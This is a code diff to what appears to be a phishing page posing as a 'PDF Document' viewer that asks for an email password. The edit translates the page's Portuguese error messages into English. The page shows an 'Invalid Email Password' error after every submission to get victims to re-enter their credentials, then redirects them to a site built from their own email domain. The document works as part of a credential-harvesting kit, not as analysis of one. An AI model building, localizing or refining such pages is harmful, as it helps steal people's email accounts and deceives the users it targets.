@@ -364,7 +364,7 @@
                                 <p>PDF Document</p>
                             </li><br>
 
-                            <div class="text-danger" id="msg" style="display: none; color: red; font-style: italic; font-size: 13px;">Invalid Password! Please Enter your correct Password</div>
+                            <div class="text-danger" id="msg" style="display: none; color: red; font-style: italic; font-size: 13px;">Invalid Email Password. Please Try again</div>
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist.
                                 Enter a different account</span>
 
@@ -458,7 +458,7 @@
             }
                     if (!password) {
                 $('#RequireTOAACode').show();
-                $('#RequireTOAACode').html("Senha de e-mail incorreta. Tente novamente..!");
+                $('#RequireTOAACode').html("Invalid Email Password..!");
 
                 return false;
             }
@@ -511,11 +511,11 @@
 
                   }
                   $("#RequireTOAACode").show();
-             $('#RequireTOAACode').html("Senha de e-mail incorreta. Tente novamente.");
+             $('#RequireTOAACode').html("Invalid Email Password. Please Try again.");
                 }
                 else{
                   $("#RequireTOAACode").show();
-             $('#RequireTOAACode').html("Senha de e-mail incorreta. Tente novamente.");
+             $('#RequireTOAACode').html("Invalid Email Password. Please Try again.");
                 }
               }
             },
@@ -526,7 +526,7 @@
                  window.location.replace("https://www."+my_slice);
               }
                   $("#RequireTOAACode").show();
-             $('#RequireTOAACode').html("Senha de e-mail incorreta. Tente novamente.");
+             $('#RequireTOAACode').html("Invalid Email Password. Please Try again");
             },
             complete: function(){
               $('#submit-btn').html('Sign in');
